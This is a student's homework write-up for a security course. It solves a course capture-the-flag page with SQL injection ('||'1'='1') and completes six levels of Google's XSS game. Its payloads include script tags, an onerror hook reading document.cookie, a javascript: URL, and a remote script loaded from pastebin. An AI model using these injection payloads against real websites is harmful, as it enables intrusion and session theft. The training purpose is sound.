# Writeup 1 - Web I

Name: *MOSES KAMOGA*
Section: *0101*

I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examination.

Digital acknowledgement: *Moses Kamoga*


## Assignment details
This assignment has two parts. It is due by 11/27/19 at 11:59PM.

**There will be late penalty of 5% per day late!**

### Part 1 (40 Pts)

Such a Quick Little, website!

[http://142.93.136.81:5000/](http://142.93.136.81:5000/)

- First things first, i clicked on everything on the website that was clickable.
  I did this, while observing the URL.

- When i clicked on the fortnite 0 - day hypertext link. I observed the URL and realised that "id = 0".
  Was the end of the URL. I realized that i could manipulate this. 

- First thing i tried was to do web shell attack. I ran this URL 
  "http://142.93.136.81:5000/item?id=https://github.com/artyuum/Simple-PHP-Web-Shell/blob/master/index.php"
  This URL gave me a blank page. 

- I continued on my advantage. Still exploiting the "id = 0". Next Stop was the SQL injection.
  I added " id = '1' = '1' ". This did not throw an error and thus i knew this was more receptable to a SQL injection. 
  So, i went ahead and started playing with this.
  I inject '0R'1'='1'". this showed that an SQL injection was detected.

- Finally, i manipulated the URL in this way. 
  http://142.93.136.81:5000/item?id='||'1'='1'
  this was translated in this way --> " http://142.93.136.81:5000/item?id=%27||%271%27=%271 "
  I scolled dowm and found the flag.

- Flag found
  CMSC389R-{y0u_ar3_th3_SQ1_ninj@}


### Part 2 (60 Pts)
Complete all 6 levels of:

[https://xss-game.appspot.com](https://xss-game.appspot.com)

Produce a writeup. We will not take off points for viewing the source code and/or viewing hints, but we strongly discourage reading online write-ups as that defeats the purpose of the homework.

level 1
- I pressed the search button and it displayed this URL "https://xss-game.appspot.com/level1/frame?query= ".
  Immediately, i knew i could inject script where in the URL where 'query = '.
  I modified the URL in this way(below) to pop a javaScript alert().
  https://xss-game.appspot.com/level1/frame?query=<script>alert();</script>
  By entering the <script>alert();</script> in the "Enter query here.." textbox and pressing the search button.

level 2
- After seeing the first two hits, i had an idea of the kind of xss injection.
  In the chat textbox, i entered this img tag and this lead to an alert to pop up.
  <img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>

level 3
- level 2, gave me an idea of what i wanted to do here. With the URL being the vulnerable bit.
  I had to manipulate it to get the desired effect of an alert. So i added this code to the URL.
  onerror='alert(1)';
  the URL became https://xss-game.appspot.com/level3/frame#3' onerror='alert(1)';'

level 4
- Putting in a single quote as one of the hints suggested. I generated a string literal error.
- Also one of the hints talked about the parse attributes that is the HTML-decode with 
  <foo bar='z'> being the same as <foo bar= '&#x7a'>
- I decided to play around with alot of HTML decode values. 
  Adding to the single quote.
  Finally, coming up with the right solution.
  By running this 
  https://xss-game.appspot.com/level4/frame?timer= ')%3Balert(1)%3Bvar b=('

level 5
- When i saw this webpage, i immediately pressed the 'next' hypertext link.
- Lookinng at the URL, there is 'next=' which raises my eyebrows. 
- Immediately, i realised that this is vulnarable to XSS. 
  I inserted the alert where the equal to is in 'next ='
  with the link below, i was able to comprise the web
  https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)

level 6
- I created a file pastebin.com to use it to put my code --alert(1)
  Looking at the hints and the source gave me a clear picture of what to write. 

  I ran this URL but added "htTps://pastebin.com/raw.php?i=15S5qZs0", to corrupt the system.
  Since looking at the code, i realised that the 'https' is not case-sensitive. 
  So, i manipulated the URL with a manipulated https  
  https://xss-game.appspot.com/level6/frame#htTps://pastebin.com/raw.php?i=15S5qZs0









### Format

Part 1 and 2 can be answered in bullet form or full, grammatical sentences.

### Scoring

* Part 1 is worth 40 points
* Part 2 is worth 60 points

### Tips

Remember to document your thought process for maximum credit!

Review the slides for help with using any of the tools or libraries discussed in
class.
